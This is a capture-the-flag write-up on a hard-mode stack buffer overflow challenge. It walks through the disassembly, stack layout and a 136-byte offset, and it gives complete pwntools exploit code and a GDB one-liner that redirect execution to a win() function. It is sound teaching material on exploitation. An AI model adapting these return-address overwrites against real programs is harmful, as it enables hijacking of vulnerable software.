# **Binary Exploitation Write-Up: Control Hijack (Hard Mode)**

## **Challenge Overview**
This challenge demonstrates classic return address overwrite exploitation in a hardened environment:
- **Objective**: Redirect execution to `win()` function at `0x4012b3`
- **Protections**: No canary, No PIE (static addresses), NX enabled
- **Vulnerability**: Unbounded `read()` into stack buffer
- **Complexity**: No debug output, requires manual reverse engineering

## **Key Findings from Reverse Engineering**

### **1. Disassembly Analysis**
```asm
lea    -0x80(%rbp), %rax   # Buffer at rbp-0x80 (128 bytes)
mov    $0x1000, %edx       # Reads up to 4096 bytes
call   read                # Vulnerable input
```

### **2. Stack Layout Reconstruction**
```
+---------------------+
| Buffer Start        | rbp-0x80 (128 bytes)
| ...                 |
| Saved RBP           | rbp
| Return Address      | rbp+0x8 (target)
+---------------------+
```

### **3. Critical Offsets**
- **Buffer to Return Address**: 136 bytes (128 + 8)
- **win() Location**: `0x4012b3` (static address)

## **Exploit Development**

### **1. Payload Structure**
```python
from pwn import *

payload = (
    b"A" * 136 +          # Padding to return address
    p64(0x4012b3)         # win() address (little-endian)
)
```

### **2. Complete Exploit Code**
```python
from pwn import *

# Start process
p = process("/challenge/binary-exploitation-control-hijack")

# Craft payload
payload = flat(
    {136: p64(0x4012b3)},
    filler="A"
)

# Send and receive
p.send(payload)
print(p.recvall())
```

## **Debugging Methodology**

### **1. GDB Verification**
```bash
gdb /challenge/binary-exploitation-control-hijack
break *challenge+280  # Before return
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\xb3\x12\x40\x00\x00\x00\x00\x00")')
x/gx $rbp+0x8          # Verify return address
```

### **2. Common Issues & Fixes**
| Symptom | Solution |
|---------|----------|
| Partial overwrite | Use `p64()` not `p32()` |
| Wrong offset | Verify with `cyclic()` pattern |
| Input corruption | Use direct binary writes |
| ASLR confusion | Confirm No PIE in checksec |

## **Key Exploitation Concepts**

1. **Stack Frame Manipulation**:
   - Precise calculation of buffer-to-return-address distance
   - Understanding 64-bit stack alignment

2. **Control Flow Hijacking**:
   - Overwriting return addresses with static function locations
   - Bypassing NX via existing code redirection

3. **Reliable Payload Delivery**:
   - Handling binary data in different execution environments
   - Avoiding terminal-induced corruption

## **Lessons Learned**

1. **Reverse Engineering Skills**:
   - Extracting critical offsets from raw disassembly
   - Determining stack layout without debug symbols

2. **Precision Requirements**:
   - Exact padding calculations
   - Proper address packing for architecture

3. **Debugging Techniques**:
   - Comparative testing between direct execution and GDB
   - Binary payload verification methods

## **Exploit Walkthrough**

1. **Determine Buffer Location**:
   - Found `lea -0x80(%rbp)` in disassembly â†’ 128 byte buffer

2. **Calculate Overflow Distance**:
   - Buffer (128) + Saved RBP (8) = 136 bytes to return address

3. **Locate Target Function**:
   - `objdump -d | grep win` revealed `0x4012b3`

4. **Craft Precision Payload**:
   - 136 bytes padding + 8 byte address overwrite

5. **Handle Input Delivery**:
   - Used direct binary writes to avoid corruption

This write-up documents a reliable methodology for solving hard-mode control flow hijacking challenges, emphasizing the importance of precise memory manipulation and thorough debugging verification.
